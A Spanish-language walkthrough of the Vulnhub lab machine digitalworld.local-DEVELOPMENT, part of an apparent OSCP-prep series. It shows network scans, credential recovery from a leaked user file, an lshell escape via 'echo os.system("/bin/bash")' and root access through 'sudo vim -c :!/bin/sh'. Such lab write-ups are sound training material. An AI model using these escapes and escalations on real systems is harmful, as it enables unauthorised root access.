---
title: Digitalworld.local-DEVELOPMENT Writeup - Vulnhub
date: 2025-02-20
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, digitalworld.local, OSCP Prep, smbmap, Wordpress]
image:
  path: /assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/portada.png
---

Anterior [**OSCP Lab 9**](https://lvs3c.github.io/posts/OSCP-SickOs1.1/)

¡Saludos!

`OSCP Lab 10`

En este writeup, realizaremos la máquina [**digitalworld.local-DEVELOPMENT**](https://www.vulnhub.com/entry/digitalworldlocal-development,280/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Fuzzing de directorios** sin usar herramientas, viendo código de la web.
- Encontrar **Path** escondido dentro de un exploit.
- Y por último, **Explotar el binario vim** para convertirnos en root y obtener la flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.23     00:0c:29:50:0d:9c       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.485 seconds (103.02 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.23
PING 10.11.12.23 (10.11.12.23) 56(84) bytes of data.
64 bytes from 10.11.12.23: icmp_seq=1 ttl=64 time=0.364 ms

--- 10.11.12.23 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.364/0.364/0.364/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.23 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 15:31 -03
Nmap scan report for 10.11.12.23
Host is up (0.0010s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
113/tcp  open  ident
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
MAC Address: 00:0C:29:50:0D:9C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.53 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p113,139,445,2222,8080 -sCV 10.11.12.23 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 15:32 -03
Nmap scan report for goodtech.com.sg (10.11.12.23)
Host is up (0.00062s latency).

PORT     STATE SERVICE       VERSION
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn   Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp open  http-proxy    IIS 6.0
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Feb 2025 18:32:11 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Feb 2025 18:32:11 GMT
|     Server: IIS 6.0
|     Allow: GET,POST,OPTIONS,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 20 Feb 2025 18:32:11 GMT
|     Server: IIS 6.0
|     Content-Length: 290
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 10.11.12.23 Port 8080</address>
|_    </body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
|_http-server-header: IIS 6.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=2/20%Time=67B7752B%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Feb\x
SF:202025\x2018:32:11\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\x
SF:20Wed,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de32
SF:091ad69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary:
SF:\x20Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/ht
SF:ml\r\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR\
SF:x20OUTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welco
SF:me\x20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20ar
SF:e\x20many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20t
SF:hese\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20W
SF:e\x20are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection\
SF:x20system\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@goo
SF:dtech\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\x
SF:20by\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20d
SF:evelopment\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20-
SF:->\r\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</htm
SF:l>\r\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x202
SF:0\x20Feb\x202025\x2018:32:11\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow:
SF:\x20GET,POST,OPTIONS,HEAD\r\nContent-Length:\x200\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1C9,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2020\x20Feb\x202025\x2018:3
SF:2:11\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20290\r\nConn
SF:ection:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\r
SF:\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN
SF:\">\n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>\
SF:n<h1>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x2
SF:0that\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>\
SF:n<hr>\n<address>IIS\x206\.0\x20Server\x20at\x2010\.11\.12\.23\x20Port\x
SF:208080</address>\n</body></html>\n");
Service Info: Host: DEVELOPMENT

Host script results:
|_clock-skew: mean: -6s, deviation: 5s, median: -10s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2025-02-20T18:34:40
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2025-02-20T18:34:40+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.98 seconds
```

El informe de `Nmap` nos revela:
- Puerto `113` servidor `ident`.
- Puerto `139` servidor `Samba smbd`.
- Puerto `445` servidor `Samba smbd`.
- Puerto `2222` servidor `EtherNetIP-1 - ssh`.
- Puerto `8080` servidor `IIS 6.0`.


### HTTP - 8080

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.23:8080/
http://10.11.12.23:8080/ [200 OK] Country[RESERVED][ZZ], Email[patrick@goodtech.com.sg], HTTPServer[IIS 6.0], IP[10.11.12.23], PoweredBy[IIS], Title[DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!]
```

![web](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/web.png){: .center-image }

En la web, nos informa que podemos ver los proyectos en `html_pages`. Validamos.

![htmlpages](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/htmlpages.png){: .center-image }

Verificamos todas y en el código de `development.html` encontramos un path.

![development](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/development.png){: .center-image }

Validamos la web y terminamos en un panel de login, le pasamos usuario y clave de prueba y muestra un error.

![dev1](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/dev1.png){: .center-image }
![dev2](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/dev2.png){: .center-image }
![dev3](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/dev3.png){: .normal }
![dev4](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/dev4.png){: .center-image }

## Explotación

---

Buscamos dicho error en internet y damos con un exploit, en el cual hace referencia a un archivo.

![error](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/error.png){: .center-image }

![exploit](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/exploit.png){: .center-image }

Validamos si existe el archivo y sí, damos con datos de usuarios.

![users](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/users.png){: .center-image }

Ingresamos los hashes en `hashes.com` y obtenemos resultados.

![pass](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/pass.png){: .center-image }


Probamos ingresar por ssh con los datos obtenidos. Usuario permitido `intern`.

Al ingresar no tenemos una consola interactiva, con `?` listamos los comandos que tenemos disponibles y con `echo os.system("/bin/bash")` lanzamos una bash.

```bash
❯ ssh intern@10.11.12.23 -p 2222
intern@10.11.12.23's password:
Last login: Thu Feb 20 19:36:23 2025 from 10.11.12.10
Congratulations! You tried harder!
Welcome to Development!
Type '?' or 'help' to get the list of allowed commands
intern:~$
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo os.system("/bin/bash")

intern@development:~$ ls
access  local.txt  work.txt
intern@development:~$
intern@development:~$ cat work.txt
1.      Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.

2.      Patrick's start of the third year in this company!

3.      Attend the meeting to discuss if password policy should be relooked at.
intern@development:~$ ls
access  local.txt  work.txt
intern@development:~$ cat local.txt
Congratulations on obtaining a user shell. :)
intern@development:~$
```


## Escalación de privilegios

Migramos al usuario `Patrick` que tenemos su clave y validamos los permisos sobre el sistema.

```bash
intern@development:~/access$ su - patrick
Password:
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
patrick@development:~$
```

El usuario tiene permiso total sobre los binarios vim y nano.

Usamos [gtfobins](https://gtfobins.github.io/)

![gtf](/assets/img/commons/vulnhub/digitalworld.local-DEVELOPMENT/gtf.png){: .center-image }

Elevamos nuestro privilegio y listamos la flag.

```bash
patrick@development:~$ sudo /usr/bin/vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
iptables-rules  lshell-0.9.9  proof.txt  smb.conf  tcpdumpclock.sh
# cat proof.txt
Congratulations on rooting DEVELOPMENT! :)
#
```

Hope it helps!